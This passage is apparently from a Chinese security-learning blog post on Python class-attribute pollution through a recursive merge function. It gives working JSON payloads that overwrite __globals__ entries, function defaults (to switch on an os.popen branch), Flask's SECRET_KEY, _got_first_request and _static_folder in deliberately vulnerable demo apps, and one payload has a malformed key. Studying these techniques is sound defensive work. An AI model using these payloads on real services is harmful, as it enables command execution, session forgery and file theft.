&quot;sys&quot; : &#123;</span><br><span class="line">                &quot;modules&quot; : &#123;</span><br><span class="line">                    &quot;test_1&quot; : &#123;</span><br><span class="line">                        &quot;secret_var&quot; : 514,</span><br><span class="line">                        &quot;target_class&quot; : &#123;</span><br><span class="line">                            &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#secret</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#114</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#514</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#Poluuuuuuted ~</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test_1.py</span><br><span class="line"></span><br><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">class target_class:</span><br><span class="line">    secret_class_var = &quot;secret&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714104439697.png"
+                      alt="image-20230714104439697"
+                ></p>
+<p>同样的我们这里还是打断点分析调试：</p>
+<p>第一次调用merge()</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714104614297.png"
+                      alt="image-20230714104614297"
+                ></p>
+<p>然后到最后我们可以发现到最后仍然是调用了merge()进行递归这里的key值是int对dst进行了初始化</p>
+<p>继续跟进：</p>
+<p>第二次调用merge()</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714104750918.png"
+                      alt="image-20230714104750918"
+                ></p>
+<p>通过变量值我们可以看到k&#x3D;<code>__globals__</code>,那么到最后仍然是调用merge()</p>
+<p>当然这里同样使用了getattr通过globals属性去查找全局变量</p>
+<p>继续跟进</p>
+<p>第三次调用merge()</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714105102180.png"
+                      alt="image-20230714105102180"
+                ></p>
+<p>这里是进入了第一个if语句，但是同样的还是调用merge()进行递归，不同的是dst的值改为了dst.get(k),这里我们的k值是sys</p>
+<p>那么这里就是获取到全局变量中sys模块对应的值</p>
+<p>我们继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714110026048.png"
+                      alt="image-20230714110026048"
+                ></p>
+<p>这里在最好调用了sys的modules模块</p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714110219632.png"
+                      alt="image-20230714110219632"
+                ></p>
+<p>我们可以看到到这里我们通过dst.get(k)使用sys的modules模块找到了我们目标模块的位置</p>
+<p>那么后面的污染过程就和我们上面的一样了，找到目标类的目标属性进行污染</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714110519208.png"
+                      alt="image-20230714110519208"
+                ></p>
+<h6 id="sys模块未导入"><a href="#sys模块未导入" class="headerlink" title="sys模块未导入"></a>sys模块未导入</h6><p>在上面的例子中我们是导入了sys模块，但是在实际环境中大部分都不会导入sys模块</p>
+<p>那么我们如果想要使用这种方法，那我们就要先要通过paylaod找到sys模块，然后再去调用，这样问题就从寻找<code>import</code>特定模块的语句转换为寻找<code>import</code>了sys模块的语句。</p>
+<p>在参考博客的文章中，大佬说这样对问题的解决并不见得有多少优化，所以为了进一步优化这个问题，这里采用的是python加载器中的loader模块</p>
+<p>在 Python 中，加载器（Loader）是用于加载模块的组件。加载器负责解析模块的源代码、编译代码（如果需要），并创建模块对象供程序使用。</p>
+<p>Python 提供了不同类型的加载器来适应不同的模块加载场景，其中一些常见的加载器包括：</p>
+<ol>
+<li>Source File Loader（源文件加载器）：用于从源代码文件加载模块。它根据模块的路径查找对应的源代码文件，并读取、解析、编译并创建模块对象。<code>importlib</code> 模块中的 <code>SourceFileLoader</code> 类提供了源文件加载器的实现。</li>
+<li>Extension Module Loader（扩展模块加载器）：用于加载编译为共享库的扩展模块。它将共享库加载到 Python 解释器中，并创建模块对象。这种加载器通常用于加载用 C&#x2F;C++ 编写的模块。<code>importlib</code> 模块中的 <code>ExtensionFileLoader</code> 类提供了扩展模块加载器的实现。</li>
+<li>Frozen Module Loader（冻结模块加载器）：用于加载被冻结（打包）为单个文件的模块。冻结模块是将模块及其依赖项打包成一个独立的文件，以便在没有源代码的情况下进行加载和使用。<code>importlib</code> 模块中的 <code>FrozenImporter</code> 类提供了冻结模块加载器的实现。</li>
+<li>Namespace Package Loader（命名空间包加载器）：用于加载命名空间包。命名空间包是一个虚拟的包，由多个独立的目录或包组成。命名空间包加载器会根据不同的目录或包来加载对应的子模块。<code>importlib</code> 模块中的 <code>NamespaceLoader</code> 类提供了命名空间包加载器的实现。</li>
+</ol>
+<p>其实这里简单来说loader就是为实现模块加载而设计的类。</p>
+<p>通过上面的关于loader的了解我没可以知道其在importlib中有具体的实现。</p>
+<p>通过了解<code>importlib</code> 模块是 Python 中用于处理模块导入的核心模块之一，并且在其所有的 Python 文件中引入了 <code>sys</code> 模块。这样可以确保在使用 <code>importlib</code> 模块时能够方便地访问和操作 <code>sys</code> 模块提供的功能</p>
+<p>那我们就可以通过importlib去找到我们要调用的sys模块</p>
+<p>这里参考博客文章上面给出了验证代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.__init__&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap_external&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib._common&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.abc&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.machinery&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.metadata&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.resources&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.util&quot;)))</span><br><span class="line">#True</span><br></pre></td></tr></table></figure></div>
+
+<p>通过代码验证我们可以看到都导入的有sys模块</p>
+<p>所以只要我们能过获取到一个<code>loader</code>便能用如<code>loader.__init__.__globals__[&#39;sys&#39;]</code>的方式拿到<code>sys</code>模块，这样进而获取目标模块。</p>
+<p>那么现在又出现了一个新的问题，loader好获取吗？如何获取？</p>
+<p> Python 中，模块的加载和导入是由 Python 解释器自动处理的。当您使用 <code>import</code> 语句导入一个模块时，Python 解释器会自动查找该模块并加载它。</p>
+<p>Python 的模块加载器会根据一定的搜索路径来查找和加载模块。搜索路径包括内置模块、已安装的第三方库以及您自己编写的模块所在的目录。Python 解释器会按照特定的顺序搜索这些路径，直到找到所需的模块。</p>
+<p>对于一个模块来说，模块中的一些内置属性会在被加载时自动填充</p>
+<p><code>__loader__</code>内置属性会被赋值为加载该模块的<code>loader</code>，这样只要能获取到任意的模块便能通过<code>__loader__</code>属性获取到<code>loader</code>，而且对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类</p>
+<p><code>_spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
+<p>由于<code>ModuleSpec</code>的属性值设置，相对于上面的获取方式，还有一种相对长的<code>payload</code>的获取方式，主要是利用<code>ModuleSpec</code>中的<code>loader</code>属性。如属性名所示，该属性的值是模块加载时所用的<code>loader</code>，在源码中如下所示：</p>
+<p><a href="https://storage.tttang.com/media/attachment/2023/01/27/b8316779-fc64-4479-b7da-151e11ace366.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/b8316779-fc64-4479-b7da-151e11ace366.png"
+                      alt="image-20230122204320376"
+                ></a></p>
+<p>所以有这样的相对长的<code>Payload</code>：<code>&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#39;sys&#39;]</code></p>
+<h6 id="实际环境中的合并函数"><a href="#实际环境中的合并函数" class="headerlink" title="实际环境中的合并函数"></a>实际环境中的合并函数</h6><p>根据学习文章的作者所述，依据原博主所述，目前发现了<code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数具有如上实例中<code>merge</code>函数类似的类属性赋值逻辑，能够实现污染攻击。所以说python的原型链污染攻击的条件有点苛刻。</p>
+<h5 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h5><p>在学习之前我们先了解一下函数的<code>__defaults__</code>和<code>__kwdefaults__</code>这两个内置属性</p>
+<p><strong>defaults</strong></p>
+<p><code>__defaults__</code>以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，<code>__defaults__</code> 是 Python 中函数对象的内置属性之一，用于访问函数的默认参数值。它是一个元组，包含了函数定义中位置参数的默认值，如果函数定义中某个位置参数具有默认值，那么该默认值会被存储在 <code>__defaults__</code> 属性中相应位置的元组元素中。如果函数没有定义位置参数的默认值，<code>__defaults__</code> 的值为 <code>None</code>。</p>
+<p>示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def my_function(a, b=10, c=None):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">defaults = my_function.__defaults__</span><br><span class="line">print(defaults) </span><br><span class="line"># (10, None)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func_a(var_1, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_b(var_1=1, /, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_c(var_1=1, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_d(var_1=1, /, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">print(func_a.__defaults__)</span><br><span class="line">print(func_b.__defaults__)</span><br><span class="line">print(func_c.__defaults__)</span><br><span class="line">print(func_d.__defaults__)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714142848725.png"
+                      alt="image-20230714142848725"
+                ></p>
+<p>通过替换属性就能够实现对函数位置或键值形参的默认值替换，但是该属性值要求为元组类型，而通常的如<code>JSON</code>等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p>
+<p>污染示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def evilFunc(arg_1 , shell = False):</span><br><span class="line">    if not shell:</span><br><span class="line">        print(arg_1)</span><br><span class="line">    else:</span><br><span class="line">        print(__import__(&quot;os&quot;).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;evilFunc&quot; : &#123;</span><br><span class="line">                &quot;__defaults__&quot; : (</span><br><span class="line">                    True ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#whoami</span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#article-kelp</span><br></pre></td></tr></table></figure></div>
+
+<p>首先看一下命令执行的代码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def evilFunc(arg_1 , shell = False):</span><br><span class="line">    if not shell:</span><br><span class="line">        print(arg_1)</span><br><span class="line">    else:</span><br><span class="line">        print(__import__(&quot;os&quot;).popen(arg_1).read())</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这个函数会对shell进行判断，如果false则将传入的参数arg_1打印输出，如果是true则调用os模块进行命令执行</p>
+<p>那我们只需要把evilFunc的shell的默认值替换为true便能够进行命令执行</p>
+<p>paylaod：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;__init__&quot; : &#123;&quot;__globals__&quot; : &#123;&quot;evilFunc&quot; : &#123;&quot;__defaults__&quot; : (True , )&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个污染和上面的是一样的，同样的通过globals获得全局变量，然后找到evilFunc修改defaults 即默认参数的值为true。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714143724771.png"
+                      alt="image-20230714143724771"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714143738589.png"
+                      alt="image-20230714143738589"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714143814110.png"
+                      alt="image-20230714143814110"
+                ></p>
+<p><strong>kwdefaults</strong></p>
+<p><code>_kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数键值形参的默认值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func_a(var_1, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_b(var_1, /, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_c(var_1, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_d(var_1, /, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">print(func_a.__kwdefaults__)</span><br><span class="line">print(func_b.__kwdefaults__)</span><br><span class="line">print(func_c.__kwdefaults__)</span><br><span class="line">print(func_d.__kwdefaults__)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144010915.png"
+                      alt="image-20230714144010915"
+                ></p>
+<p>可以看到kwdefaults是收录着函数的关键字参数的默认值</p>
+<p>污染示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def evilFunc(arg_1 , * , shell = False):</span><br><span class="line">    if not shell:</span><br><span class="line">        print(arg_1)</span><br><span class="line">    else:</span><br><span class="line">        print(__import__(&quot;os&quot;).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;evilFunc&quot; : &#123;</span><br><span class="line">                &quot;__kwdefaults__&quot; : &#123;</span><br><span class="line">                    &quot;shell&quot; : True</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#whoami</span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#article-kelp</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144304677.png"
+                      alt="image-20230714144304677"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144318889.png"
+                      alt="image-20230714144318889"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144333009.png"
+                      alt="image-20230714144333009"
+                ></p>
+<h5 id="flask相关特定属性的相关利用"><a href="#flask相关特定属性的相关利用" class="headerlink" title="flask相关特定属性的相关利用"></a>flask相关特定属性的相关利用</h5><h6 id="secret-key伪造"><a href="#secret-key伪造" class="headerlink" title="secret_key伪造"></a>secret_key伪造</h6><p>我们可以通过污染去修改secret_key的值，然后进行任意session伪造</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;[+]Config:%s&quot;%(app.config[&#x27;SECRET_KEY&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714145412365.png"
+                      alt="image-20230714145412365"
+                ></p>
+<p>这里因为并没有设置密钥所以为空</p>
+<p>但是我们可以通过payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;config&quot; : &#123;</span><br><span class="line">                    &quot;SECRET_KEY&quot; :&quot;Polluted~&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>去修改SECRET_KEY的值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714145535300.png"
+                      alt="image-20230714145535300"
+                ></p>
+<p>可以看到已经污染成功了</p>
+<p>这里的污染思路和我们上面修改自定义属性和修改内置属性的方法是相同的，这也是原型链污染的一个应用吧。</p>
+<h5 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a>_got_first_request</h5><p>通常被用来判断某次请求是否为flask启动后的第一次请求，是是<code>Flask.got_first_request</code>函数的返回值</p>
+<p>污染示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = &quot;Is flag here?&quot;</span><br><span class="line"></span><br><span class="line">@app.before_first_request</span><br><span class="line">def init():</span><br><span class="line">    global flag</span><br><span class="line">    if hasattr(app, &quot;special&quot;) and app.special == &quot;U_Polluted_It&quot;:</span><br><span class="line">        flag = open(&quot;flag&quot;, &quot;rt&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    global flag</span><br><span class="line">    setattr(app, &quot;special&quot;, &quot;U_Polluted_It&quot;)</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>通过分析代码我们可以知道只有程序启动后，<code>before_first_request</code>修饰的<code>init</code>函数只会在第一次访问前被调用，但是我们读取flag又需要访问路由&#x2F;才能够触发，这样就造成了相互矛盾，那也就是说我们访问&#x2F;要把<code>_got_first_request</code>属性值重置为假。这样才能够去调用before_first_request才会被调用</p>
+<p>同样的通过globals获取全局变量然后找到_got_first_request修改其值为假</p>
+<p>paylaod：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                 &quot;_got_first_request&quot; : false           </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714151010859.png"
+                      alt="image-20230714151010859"
+                ></p>
+<p>执行paylaod，修改属性值为假</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714151136578.png"
+                      alt="image-20230714151136578"
+                ></p>
+<h5 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path"></a>_static_url_path</h5><p>在Flask框架中，<code>_static_url_path</code>是一个应用对象（<code>Flask</code>实例）的属性，用于设置静态文件的URL路径。</p>
+<p><code>_static_url_path</code>属性用于设置静态文件的URL路径前缀。默认情况下，它的值为<code>/static</code>，这意味着静态文件可以通过类似<code>http://example.com/static/css/style.css</code>的URL路径进行访问</p>
+<p>污染示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#static/index.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;flag in ./flag but heres only static/index.html&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153747051.png"
+                      alt="image-20230714153747051"
+                ></p>
+<p>尝试目录穿越</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153803804.png"
+                      alt="image-20230714153803804"
+                ></p>
+<p>通过污染修改属性值为当前目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153923580.png"
+                      alt="image-20230714153923580"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153946310.png"
+                      alt="image-20230714153946310"
+                ></p>
+<p>paylaod：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;               </span><br><span class="line">                    &quot;_static_folder : &quot;./&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h5 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a>os.path.pardir</h5><p><code>os.path.pardir</code>是<code>os.path</code>模块中的一个常量，用于表示上一级目录的字符串。会影响flask模板渲染函数render_template的解析。</p>
+<p>污染示例：</p>
